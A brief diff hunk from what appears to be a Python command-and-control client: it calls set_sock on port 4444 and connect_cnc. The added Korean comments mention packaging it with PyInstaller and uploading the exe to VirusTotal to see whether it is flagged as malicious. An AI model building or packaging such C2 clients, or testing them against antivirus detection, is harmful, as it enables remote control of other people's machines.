@@ -51,3 +51,6 @@ if __name__ == "__main__":
     port = 4444
     s = set_sock(ip, port)
     connect_cnc(s)
+
+# pyinstaller
+# virustotal.com  생성한 exe 파일을 업로드해 악성 코드인지 판별가능
